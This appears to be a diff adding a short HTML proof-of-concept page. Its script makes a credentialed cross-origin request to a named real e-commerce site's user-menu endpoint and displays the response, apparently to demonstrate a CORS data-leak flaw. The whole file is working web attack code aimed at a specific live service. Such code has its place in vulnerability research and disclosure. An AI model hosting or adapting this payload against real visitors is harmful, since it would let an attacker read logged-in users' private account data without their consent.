@@ -1,0 +1,13 @@
+<html>
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('GET','https://www.mercadolibre.com.ar/menu/user'); 
+req.withCredentials = true;
+req.setRequestHeader("X-Requested-With","XMLHttpRequest");
+req.send('{}'); 
+
+function reqListener() { alert(this.responseText); };
+
+</script>
+</html>
